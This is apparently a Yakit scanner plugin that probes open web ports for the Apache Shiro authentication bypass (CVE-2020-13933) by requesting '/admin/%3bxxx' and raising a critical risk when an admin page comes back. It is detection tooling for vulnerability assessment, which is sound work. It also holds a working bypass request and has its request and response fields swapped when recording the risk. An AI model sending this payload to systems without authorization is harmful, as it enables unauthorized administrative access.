# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    path = `/admin/%3bxxx`

    packet1 = `GET /admin/%3bxxx HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

`


    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(10),
    )
    rspIns, _ = poc.ParseBytesToHTTPResponse(rsp)
    reqIns, _ = poc.ParseBytesToHTTPRequest(req)
    if str.MatchAllOfSubString(rsp, "admin page") {
            yakit.Info(
                "%v found Apache Shiro 身份验证绕过漏洞", 
                addr, 
            )
            risk.NewRisk(
                addr,
                risk.title("Apache Shiro 身份验证绕过漏洞(CVE-2020-13933)"),
                risk.severity("critical"),
                risk.titleVerbose("Apache Shiro 身份验证绕过漏洞复现(CVE-2020-13933)"),
                risk.request(string(rspIns)),
                risk.response(string(reqIns)),
                risk.cve("CVE-2020-13933"),
            )
        }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
